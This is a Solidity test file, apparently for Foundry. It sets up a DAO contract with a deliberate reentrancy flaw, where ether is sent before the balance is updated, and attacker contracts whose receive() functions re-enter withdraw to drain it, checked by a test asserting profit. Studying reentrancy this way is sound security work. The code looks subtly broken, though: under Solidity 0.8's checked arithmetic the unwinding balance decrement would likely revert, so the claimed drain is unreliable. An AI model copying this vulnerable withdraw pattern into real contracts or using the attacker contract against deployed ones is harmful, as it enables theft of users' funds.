// test/DAOAttackTest.sol
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableDAO {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract DAOAttacker {
    address public dao;

    constructor(address _dao) {
        dao = _dao;
    }

    function startAttack() public payable {
        require(msg.value == 1 ether, "Send 1 ETH");
        (bool success, ) = dao.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
        (success, ) = dao.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        require(success, "Withdraw failed");
    }

    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        }
    }
}

contract DAOAttackTest is Test {
    VulnerableDAO public dao;

    function setUp() public {
        dao = new VulnerableDAO();
    }

    function testReentrancyAttack() public {
        vm.deal(address(dao), 10 ether);

        DAOAttacker attacker = new DAOAttacker(address(dao));
        vm.deal(address(attacker), 1 ether);

        (bool success, ) = address(attacker).call{value: 1 ether}(
            abi.encodeWithSignature("startAttack()")
        );
        require(success, "Attack failed");

        assertGt(address(attacker).balance, 1 ether, "Attacker should have more than 1 ETH");
    }
}

contract ReentrancyTester {
    VulnerableDAO dao;

    constructor(address _dao) {
        dao = VulnerableDAO(_dao);
    }

    function test() public payable {
        dao.deposit{value: 1 ether}();

        dao.withdraw(1 ether);
    }

    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw(1 ether);
        }
    }
}
